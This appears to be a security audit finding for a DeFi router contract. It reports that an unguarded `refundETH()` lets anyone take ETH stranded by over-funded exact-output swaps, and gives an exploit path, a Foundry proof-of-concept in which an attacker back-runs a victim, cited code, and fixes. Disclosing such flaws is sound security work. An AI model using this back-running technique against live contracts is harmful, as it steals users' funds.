Audit Report

## Title
Unguarded `refundETH()` allows any caller to drain ETH left on the router by a prior exact-output multicall — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary
`refundETH()` unconditionally transfers the router's entire ETH balance to `msg.sender` with no check that the caller is the original depositor. The `pay()` function wraps only the exact `value` needed when `nativeBalance >= value`, leaving any excess ETH stranded on the router. An attacker can back-run any transaction that leaves ETH on the router and call `refundETH()` to steal it.

## Finding Description
`refundETH()` at [1](#0-0)  sends `address(this).balance` to `msg.sender` with no depositor check.

The `pay()` function at [2](#0-1)  wraps exactly `value` ETH when `nativeBalance >= value`, leaving `nativeBalance - value` as raw ETH on the contract.

`multicall` at [3](#0-2)  is `payable` but performs no ETH accounting — it does not enforce that all ETH is consumed or returned to the original sender.

Exploit path:
1. Victim calls `multicall{value: X}([exactOutputSingle(...)])` without appending `refundETH()`, or calls `exactOutputSingle{value: X}` directly where `X > amountIn`.
2. `pay()` wraps only `amountIn` ETH; `X - amountIn` remains on the router.
3. Attacker back-runs and calls `refundETH()`, receiving all stranded ETH.

The `receive()` guard at [4](#0-3)  only blocks unsolicited ETH pushes from non-WETH addresses; it does not prevent ETH deposited via `payable` function calls from being stranded across transaction boundaries.

## Impact Explanation
Direct loss of user ETH principal. For exact-output swaps the user cannot know the precise `amountIn` in advance and must over-fund; the excess is at risk. Severity: **High** — no preconditions beyond the user not appending `refundETH()` to their batch, which is a realistic omission for integrators or direct callers.

## Likelihood Explanation
Any user calling `exactOutputSingle{value: X}` directly (not via multicall), or any integrator that builds a multicall without a trailing `refundETH()`, is vulnerable. The test suite at [5](#0-4)  demonstrates the correct pattern (with `refundETH()` appended), implying the incorrect pattern (without it) is a realistic omission. Attackers can trivially monitor for transactions that leave ETH on the router and back-run them.

## Recommendation
Either:
1. Track the original depositor in transient storage at `multicall` entry and restrict `refundETH()` to that address, or
2. Auto-refund excess ETH at the end of `multicall` to `msg.sender` unconditionally (eliminating the need for a separate `refundETH()` call), or
3. At minimum, document prominently that `refundETH()` must always be the last call in any ETH-input multicall batch, and consider adding a `recipient` parameter so the refund goes to a specified address rather than `msg.sender`.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

function test_refundETH_stolen_by_attacker() public {
    address victim  = makeAddr("victim");
    address attacker = makeAddr("attacker");
    vm.deal(victim, 2 ether);

    // Victim calls exactOutputSingle with 2 ether but only ~1000 wei is consumed.
    // Victim forgets to append refundETH() to the batch.
    vm.prank(victim);
    bytes[] memory calls = new bytes[](1);
    calls[0] = abi.encodeWithSelector(
        router.exactOutputSingle.selector,
        IMetricOmmSimpleRouter.ExactOutputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountOut: 1_000,
            amountInMaximum: type(uint128).max,
            recipient: victim,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );
    router.multicall{value: 2 ether}(calls);

    // Router now holds ~2 ether - amountIn (excess ETH).
    uint256 routerBalance = address(router).balance;
    assertGt(routerBalance, 0, "excess ETH on router");

    // Attacker back-runs and calls refundETH() — no victim check.
    vm.prank(attacker);
    router.refundETH();

    assertEq(attacker.balance, routerBalance, "attacker stole victim ETH");
    assertEq(victim.balance, 0,              "victim lost excess ETH");
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L74-78)
```text
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L39-44)
```text
  function multicall(bytes[] calldata data) public payable override returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i < data.length; i++) {
      results[i] = Address.functionDelegateCall(address(this), data[i]);
    }
  }
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L106-133)
```text
  function test_multicall_ethInput_exactInputSingle_refundsUnusedEth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;
    uint256 swapperEthBefore = swapper.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);

    assertEq(swapper.balance, swapperEthBefore - amountIn, "unused eth refunded");
    _assertRouterEmpty();
  }
```
